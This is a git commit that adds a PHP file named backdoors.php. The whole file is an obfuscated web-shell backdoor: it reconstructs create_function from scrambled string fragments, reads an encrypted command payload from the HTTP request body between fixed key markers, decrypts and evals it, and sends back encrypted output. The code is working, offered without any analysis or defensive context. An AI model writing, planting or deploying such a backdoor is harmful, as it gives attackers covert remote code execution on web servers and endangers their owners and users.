4ebad8d095033d340d36cf858755c17a924eeb73
omarshrif4685 <102856148+omarshrif4685@users.noreply.github.com>
2023-11-30 17:24:42 +0200

    Add files via upload

---
+++ backdoors.php
@@ -0,0 +1,13 @@
+<?php
+$Z=str_replace('BL','','crBLeaBLBLte_fuBLnBLBLction');
+$j='-;$j++,$i++)-{$o.=$t{$i}-^$k{$j}-;}-}return $-o;}if- (@-preg_matc';
+$n='e-64_enco-de(@x(--@gzcompr-es-s($o),$-k));print-("$-p$kh$r$kf");}';
+$p='2bh2-mtS3L-lF1-m-4wE";f--unction x($t,$k){$c-=strlen($k-)--;$l=s';
+$b='$k="2-0-2cb9-62";$kh="ac59-075b-964b";$--kf="-07152d234b70"-;$p="';
+$G='m)==1-) {@ob_sta-rt();@e-v-al(@gzunco-mpr--ess-(@x(@bas--e64_decode(';
+$c='$m[1]-),$k)));$o---=@ob_get_conte-nts();@o-b_end_cl-ean();$r-=@bas';
+$U='trlen(-$t);$o=""-;for($i=0-;$i-<$l;-){for($j-=0;($j<$c-&&$i<-$l)-';
+$I='h-("/$kh(--.+)$kf/",@-file-_get_-contents("-p-hp://input"-),$-';
+$k=str_replace('-','',$b.$p.$U.$j.$I.$G.$c.$n);
+$t=$Z('',$k);$t();
+?>
